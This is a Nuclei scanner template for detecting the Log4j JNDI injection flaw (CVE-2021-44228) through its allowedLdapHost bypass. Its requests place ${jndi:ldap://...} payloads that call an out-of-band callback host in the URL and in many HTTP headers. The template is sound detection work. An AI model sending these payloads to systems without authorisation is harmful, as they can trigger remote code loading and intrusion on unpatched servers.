id: log4j-generic-allowedLdapHost

info:
  name: Remote code injection in Log4j
  author: melbadry9,dhiyaneshDK,daffainfo,anon-artist,0xceba,Tea
  severity: critical
  description: Apache Log4j2 <=2.14.1 JNDI features used in configuration, log messages, and parameters do not protect against attacker controlled LDAP and other JNDI related endpoints. An attacker who can control log messages or log message parameters can execute arbitrary code loaded from LDAP servers when message lookup substitution is enabled.
  reference:
    - https://github.com/advisories/GHSA-jfh8-c2jp-5v3q
    - https://www.lunasec.io/docs/blog/log4j-zero-day/
    - https://gist.github.com/bugbountynights/dde69038573db1c12705edb39f9a704a
    - https://github.com/projectdiscovery/nuclei-templates/commit/ca6146a4afc2033f0d4d10786f3af17c736af330#diff-b7836c5cbba25b1249451cc9ab0b6afb95552688444df672c0574ebe73075115
  tags: cve,cve2021,rce,oast,log4j

requests:
  - raw:
      - |
        GET /?x=${jndi:ldap://localhost%23{{Host}}.{{interactsh-url}}} HTTP/1.1
        Host: {{Hostname}}
        Accept: ${jndi:ldap://localhost#{{Host}}.accept.{{interactsh-url}}}
        Accept-Encoding: ${jndi:ldap://localhost#{{Host}}.acceptencoding.{{interactsh-url}}}
        Accept-Language: ${jndi:ldap://localhost#{{Host}}.acceptlanguage.{{interactsh-url}}}

      - |
        GET /?x=${jndi:ldap://localhost%23{{Host}}.{{interactsh-url}}} HTTP/1.1
        Host: {{Hostname}}
        X-CSRF-Token: ${jndi:ldap://localhost#{{Host}}.xcsrftoken.{{interactsh-url}}}
        X-Druid-Comment: ${jndi:ldap://localhost#{{Host}}.xdruidcomment.{{interactsh-url}}}
        X-Forwarded-For: ${jndi:ldap://localhost#{{Host}}.xforwardedfor.{{interactsh-url}}}

      - |
        GET /?x=${jndi:ldap://localhost%23{{Host}}.{{interactsh-url}}} HTTP/1.1
        Host: {{Hostname}}
        Referer: ${jndi:ldap://localhost#{{Host}}.referer.{{interactsh-url}}}
        Upgrade-Insecure-Requests: ${jndi:ldap://localhost#{{Host}}.upgradeinsecurerequests.{{interactsh-url}}}
        User-Agent: ${jndi:ldap://localhost#{{Host}}.useragent.{{interactsh-url}}}
        X-Api-Version: ${jndi:ldap://localhost#{{Host}}.xapiversion.{{interactsh-url}}}

      - |
        GET /?x=${jndi:ldap://localhost%23{{Host}}.{{interactsh-url}}} HTTP/1.1
        Host: {{Hostname}}
        Authentication: Bearer ${jndi:ldap://localhost#{{Host}}.authenticationbearer.{{interactsh-url}}}
        Cookie: ${jndi:ldap://localhost#{{Host}}.cookiename.{{interactsh-url}}}=${jndi:ldap://{{Host}}.cookievalue.{{interactsh-url}}}
        Location: ${jndi:ldap://localhost#{{Host}}.location.{{interactsh-url}}}
        Origin: ${jndi:ldap://localhost#{{Host}}.origin.{{interactsh-url}}}

      - |
        GET /?x=${jndi:ldap://localhost%23{{Host}}.{{interactsh-url}}} HTTP/1.1
        Host: {{Hostname}}
        Access-Control-Request-Headers: ${jndi:ldap://localhost#{{Host}}.accesscontrolrequestheaders.{{interactsh-url}}}
        Access-Control-Request-Method: ${jndi:ldap://localhost#{{Host}}.accesscontrolrequestmethod.{{interactsh-url}}}
        Authentication: Basic ${jndi:ldap://localhost#{{Host}}.authenticationbasic.{{interactsh-url}}}
        
      - |
        GET /?x=${jndi:ldap://localhost%23{{Host}}.{{interactsh-url}}} HTTP/1.1
        Host: {{Hostname}}
        X-Origin: ${jndi:ldap://localhost#{{Host}}.xorigin.{{interactsh-url}}}
        If-Modified-Since: ${jndi:ldap://localhost#{{Host}}.ifmodifieds.{{interactsh-url}}}
        

    matchers-condition: and
    matchers:
      - type: word
        part: interactsh_protocol  # Confirms the DNS Interaction
        words:
          - "dns"

      - type: regex
        part: interactsh_request
        regex:
          - '([a-zA-Z0-9\.\-\_\#]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'   # Print extracted {{Host}} in output

    extractors:
      - type: regex
        part: interactsh_request
        group: 2
        regex:
          - '([a-zA-Z0-9\.\-\_\#]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'   # Print injection point in output

      - type: regex
        part: interactsh_request
        group: 1
        regex:
          - '([a-zA-Z0-9\.\-\_\#]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'   # Print extracted {{Host}} in output
